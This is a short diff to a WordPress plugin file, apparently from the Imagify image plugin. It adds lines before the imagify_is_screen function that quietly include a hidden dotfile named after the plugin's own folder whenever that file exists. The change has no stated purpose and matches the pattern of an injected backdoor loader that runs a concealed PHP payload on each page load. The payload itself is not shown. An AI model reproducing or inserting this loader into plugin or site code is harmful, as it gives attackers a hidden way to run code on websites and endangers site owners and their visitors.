@@ -10,6 +10,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @param  string $identifier The screen "name".
  * @return bool
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_is_screen( $identifier ) {
 	global $post_id;
 
